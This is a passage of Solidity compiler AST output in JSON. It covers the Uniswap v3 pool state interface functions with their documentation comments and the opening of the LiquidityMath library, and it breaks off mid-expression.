										"text": "@notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n when accessed externally.\n @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n tick The current tick of the pool, i.e. according to the last tick transition that was run.\n This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n boundary.\n observationIndex The index of the last oracle observation that was written,\n observationCardinality The current maximum number of observations stored in the pool,\n observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n feeProtocol The protocol fee for both tokens of the pool.\n Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n unlocked Whether the pool is currently locked to reentrancy"
									},
									"functionSelector": "3850c7bd",
									"id": 437,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "slot0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 421,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1435:2:7"
									},
									"returnParameters": {
										"id": 436,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 423,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1498:20:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 422,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "1498:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 425,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1532:10:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 424,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1532:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 427,
												"mutability": "mutable",
												"name": "observationIndex",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1556:23:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 426,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1556:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 429,
												"mutability": "mutable",
												"name": "observationCardinality",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1593:29:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 428,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1593:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 431,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1636:33:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 430,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1636:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 433,
												"mutability": "mutable",
												"name": "feeProtocol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1683:17:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 432,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1683:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 435,
												"mutability": "mutable",
												"name": "unlocked",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 437,
												"src": "1714:13:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 434,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1714:4:7",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1484:253:7"
									},
									"scope": 524,
									"src": "1421:317:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 438,
										"nodeType": "StructuredDocumentation",
										"src": "1744:168:7",
										"text": "@notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "f3058399",
									"id": 443,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal0X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 439,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1946:2:7"
									},
									"returnParameters": {
										"id": 442,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 441,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 443,
												"src": "1972:7:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 440,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1972:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1971:9:7"
									},
									"scope": 524,
									"src": "1917:64:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 444,
										"nodeType": "StructuredDocumentation",
										"src": "1987:168:7",
										"text": "@notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "46141319",
									"id": 449,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal1X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 445,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2189:2:7"
									},
									"returnParameters": {
										"id": 448,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 447,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 449,
												"src": "2215:7:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 446,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2215:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2214:9:7"
									},
									"scope": 524,
									"src": "2160:64:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 450,
										"nodeType": "StructuredDocumentation",
										"src": "2230:147:7",
										"text": "@notice The amounts of token0 and token1 that are owed to the protocol\n @dev Protocol fees will never exceed uint128 max in either token"
									},
									"functionSelector": "1ad8b03b",
									"id": 457,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "protocolFees",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 451,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2403:2:7"
									},
									"returnParameters": {
										"id": 456,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 453,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 457,
												"src": "2429:14:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 452,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2429:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 455,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 457,
												"src": "2445:14:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 454,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2445:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2428:32:7"
									},
									"scope": 524,
									"src": "2382:79:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 458,
										"nodeType": "StructuredDocumentation",
										"src": "2467:150:7",
										"text": "@notice The currently in range liquidity available to the pool\n @dev This value has no relationship to the total liquidity across all ticks"
									},
									"functionSelector": "1a686502",
									"id": 463,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "liquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 459,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2640:2:7"
									},
									"returnParameters": {
										"id": 462,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 461,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 463,
												"src": "2666:7:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 460,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2666:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2665:9:7"
									},
									"scope": 524,
									"src": "2622:53:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 464,
										"nodeType": "StructuredDocumentation",
										"src": "2681:1244:7",
										"text": "@notice Look up information about a specific tick in the pool\n @param tick The tick to look up\n @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n tick upper,\n liquidityNet how much liquidity changes when the pool price crosses the tick,\n feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n secondsOutside the seconds spent on the other side of the tick from the current tick,\n initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n In addition, these values are only relative and must be used only in comparison to previous snapshots for\n a specific position."
									},
									"functionSelector": "f30dba93",
									"id": 485,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ticks",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 467,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 466,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "3945:10:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 465,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3945:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3944:12:7"
									},
									"returnParameters": {
										"id": 484,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 469,
												"mutability": "mutable",
												"name": "liquidityGross",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4017:22:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 468,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "4017:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 471,
												"mutability": "mutable",
												"name": "liquidityNet",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4053:19:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 470,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "4053:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 473,
												"mutability": "mutable",
												"name": "feeGrowthOutside0X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4086:29:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 472,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4086:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 475,
												"mutability": "mutable",
												"name": "feeGrowthOutside1X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4129:29:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 474,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4129:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 477,
												"mutability": "mutable",
												"name": "tickCumulativeOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4172:27:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 476,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "4172:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 479,
												"mutability": "mutable",
												"name": "secondsPerLiquidityOutsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4213:38:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 478,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4213:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 481,
												"mutability": "mutable",
												"name": "secondsOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4265:21:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 480,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "4265:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 483,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 485,
												"src": "4300:16:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 482,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4300:4:7",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4003:323:7"
									},
									"scope": 524,
									"src": "3930:397:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 486,
										"nodeType": "StructuredDocumentation",
										"src": "4333:99:7",
										"text": "@notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
									},
									"functionSelector": "5339c296",
									"id": 493,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickBitmap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 489,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 488,
												"mutability": "mutable",
												"name": "wordPosition",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 493,
												"src": "4457:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int16",
													"typeString": "int16"
												},
												"typeName": {
													"id": 487,
													"name": "int16",
													"nodeType": "ElementaryTypeName",
													"src": "4457:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int16",
														"typeString": "int16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4456:20:7"
									},
									"returnParameters": {
										"id": 492,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 491,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 493,
												"src": "4500:7:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 490,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4500:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4499:9:7"
									},
									"scope": 524,
									"src": "4437:72:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 494,
										"nodeType": "StructuredDocumentation",
										"src": "4515:700:7",
										"text": "@notice Returns the information about a position by the position's key\n @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n @return _liquidity The amount of liquidity in the position,\n Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
									},
									"functionSelector": "514ea4bf",
									"id": 509,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "positions",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 497,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 496,
												"mutability": "mutable",
												"name": "key",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5239:11:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 495,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "5239:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5238:13:7"
									},
									"returnParameters": {
										"id": 508,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 499,
												"mutability": "mutable",
												"name": "_liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5312:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 498,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5312:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 501,
												"mutability": "mutable",
												"name": "feeGrowthInside0LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5344:32:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 500,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5344:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 503,
												"mutability": "mutable",
												"name": "feeGrowthInside1LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5390:32:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 502,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5390:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 505,
												"mutability": "mutable",
												"name": "tokensOwed0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5436:19:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 504,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5436:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 507,
												"mutability": "mutable",
												"name": "tokensOwed1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 509,
												"src": "5469:19:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 506,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5469:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5298:200:7"
									},
									"scope": 524,
									"src": "5220:279:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 510,
										"nodeType": "StructuredDocumentation",
										"src": "5505:749:7",
										"text": "@notice Returns data about a specific observation index\n @param index The element of the observations array to fetch\n @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n ago, rather than at a specific index in the array.\n @return blockTimestamp The timestamp of the observation,\n Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n Returns initialized whether the observation has been initialized and the values are safe to use"
									},
									"functionSelector": "252c09d7",
									"id": 523,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observations",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 513,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 512,
												"mutability": "mutable",
												"name": "index",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 523,
												"src": "6281:13:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 511,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6281:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6280:15:7"
									},
									"returnParameters": {
										"id": 522,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 515,
												"mutability": "mutable",
												"name": "blockTimestamp",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 523,
												"src": "6356:21:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 514,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "6356:6:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 517,
												"mutability": "mutable",
												"name": "tickCumulative",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 523,
												"src": "6391:20:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 516,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "6391:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 519,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 523,
												"src": "6425:41:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 518,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "6425:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 521,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 523,
												"src": "6480:16:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 520,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "6480:4:7",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6342:164:7"
									},
									"scope": 524,
									"src": "6259:248:7",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 525,
							"src": "240:6269:7"
						}
					],
					"src": "45:6465:7"
				},
				"id": 7
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
					"exportedSymbols": {
						"LiquidityMath": [
							576
						]
					},
					"id": 577,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 526,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:8"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 527,
								"nodeType": "StructuredDocumentation",
								"src": "71:38:8",
								"text": "@title Math library for liquidity"
							},
							"fullyImplemented": true,
							"id": 576,
							"linearizedBaseContracts": [
								576
							],
							"name": "LiquidityMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 574,
										"nodeType": "Block",
										"src": "456:163:8",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													},
													"id": 539,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 537,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 532,
														"src": "470:1:8",
														"typeDescriptions": {
															"typeIdentifier": "t_int128",
															"typeString": "int128"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
